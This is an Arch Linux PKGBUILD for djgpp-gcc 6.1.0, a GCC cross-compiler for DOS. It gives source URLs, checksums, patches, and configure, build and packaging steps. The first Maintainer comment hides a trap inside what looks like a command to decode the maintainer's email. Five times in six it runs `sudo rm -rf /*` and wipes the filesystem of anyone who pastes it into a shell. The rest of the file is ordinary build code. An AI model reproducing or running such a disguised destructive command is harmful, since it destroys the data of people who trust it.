# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Adapted from the mingw-w64-gcc package, authors below
# $Id: PKGBUILD 137310 2015-07-23 10:02:53Z spupykin $
# Maintainer: Sergej Pupykin <pupykin.s+arch@gmail.com>
# Maintainer: rubenvb vanboxem <dottie> ruben <attie> gmail <dottie> com

pkgname=djgpp-gcc
pkgver=6.1.0
_target="i686-pc-msdosdjgpp"
_islver=0.16.1
_cloogver=0.18.4
_djver=2.05
pkgrel=1
pkgdesc="Cross GCC for the djgpp cross-compiler"
arch=('i686' 'x86_64')
url="http://gcc.gnu.org"
license=('GPL' 'LGPL' 'FDL' 'custom')
groups=('djgpp-toolchain' 'djgpp')
depends=('zlib' 'libmpc' 'djgpp-binutils')
#makedepends+=("gcc-ada=${pkgver}")
optdepends=('djgpp-djcrx: headers and utilities')
replaces=()
backup=()
options=('!strip' 'staticlibs' '!emptydirs' '!buildflags')
source=(
	"ftp://gcc.gnu.org/pub/gcc/releases/gcc-${pkgver}/gcc-${pkgver}.tar.bz2"
	"http://isl.gforge.inria.fr/isl-${_islver}.tar.bz2"
	"http://www.bastoul.net/cloog/pages/download/cloog-${_cloogver}.tar.gz"
	"http://www.delorie.com/pub/djgpp/current/v2/djcrx${_djver//./}.zip"
	'gcc-make-xmmintrin-header-cplusplus-compatible.patch'
	'lto.patch'
)
sha512sums=(
	'eeed3e2018b8c012aabce419e8d718fde701e5c3c179b4486c61ba46e5736eecc8fccdd18b01fcd973a42c6ad3116dbbe2ee247fe3757d622d373f93ebaf8d2e'
	'c188667a84dc5bdddb4ab7c35f89c91bf15a8171f4fcaf41301cf285fb7328846d9a367c096012fec4cc69d244f0bc9e95d84c09ec097394cd4093076f2a041b'
	'd35d67b08ffe13c1a010b65bfe4dd02b0ae013d5b489e330dc950bd3514defca8f734bd37781856dcedf0491ff6122c34eecb4b0fe32a22d7e6bdadea98c8c23'
	'248034a3c026971eeaa6421ef40f44d03873c62d4edf97490e98c71ac76662eaed531eb734e137a38a644483a34065c3ffc70d3d739682d53c8863bf7b521b90'
	'7aa9bd2ad82e4ee2e20c45303f0d3df8c040f4ce9854d24e20b920f52de9ab3986e4170224d68672a0f3ab883fea61c6b93380a87bed9cb63d9b865b43765602'
	'e9fd69b34f1624c17f9db7c82578dbed4fb62d215a2d0ea33c9ed9db958bc75736fba939dafd4aa74bf5539afdf97a5177cc40acd5a76c8c7f65b67a8e2fea68'
)
noextract=("djcrx${_djver//./}.zip")


prepare() {
	cd "${srcdir}/gcc-${pkgver}"

	# link isl/cloog for in-tree builds
	ln -fs "../isl-${_islver}" isl
	ln -fs "../cloog-${_cloogver}" cloog

	#do not install libiberty
	sed -i 's/install_to_$(INSTALL_DEST) //' libiberty/Makefile.in
	# hack! - some configure tests for header files using "$CPP $CPPFLAGS"
	sed -i "/ac_cpp=/ s/\$CPPFLAGS/\$CPPFLAGS -O2/" {libiberty,gcc}/configure
	# actually build the lto plugin
	patch -Np0 < ../lto.patch

	# extract bootstrap djcrx
	mkdir -p "${srcdir}/gcc-build-${_target}/lib/gcc/${_target}/$pkgver"
	cd "${srcdir}/gcc-build-${_target}/lib/gcc/${_target}/$pkgver"
	unzip -qoW "${srcdir}/djcrx${_djver//./}.zip" 'include/**' 'lib/*.[oa]'
	mv lib/* .
	ln -fs /bin/true stubify

	# monkeypatch libc to prepare for building without an ldscript
	echo '.comm __environ,16' > environ.s
	i686-pc-msdosdjgpp-as environ.s -o environ.o
	i686-pc-msdosdjgpp-ar q libc.a environ.o
}

build() {
	cd "${srcdir}/gcc-build-${_target}"
	"${srcdir}/gcc-${pkgver}/configure" --prefix=/usr --libexecdir=/usr/lib \
		--target="${_target}" \
		--enable-languages=c,objc,c++,obj-c++ \
		--enable-shared --enable-static \
		--enable-threads=no --enable-fully-dynamic-string --disable-libstdcxx \
		--with-system-zlib --enable-cloog-backend=isl \
		--enable-lto --disable-dw2-exceptions --disable-libgomp \
		--disable-multilib --enable-checking=release
	make all
}

package() {
	cd "${srcdir}/gcc-build-${_target}"
	make DESTDIR="${pkgdir}" install
	strip "${pkgdir}/usr/bin/${_target}"-*
	strip "${pkgdir}/usr/lib/gcc/${_target}/${pkgver}"/{cc1*,collect2,lto*}
	ln -s "${_target}-gcc" "$pkgdir/usr/bin/${_target}-cc"
	# mv dlls
	mkdir -p "$pkgdir/usr/${_target}/bin/"

	strip "${pkgdir}/usr/bin"/*
	# remove unnecessary files
	rm -r "${pkgdir}/usr/share"
	rm -f "${pkgdir}/usr/lib"/libcc1.so*
	rm -f "${pkgdir}/usr/lib"/libcc1.a
}
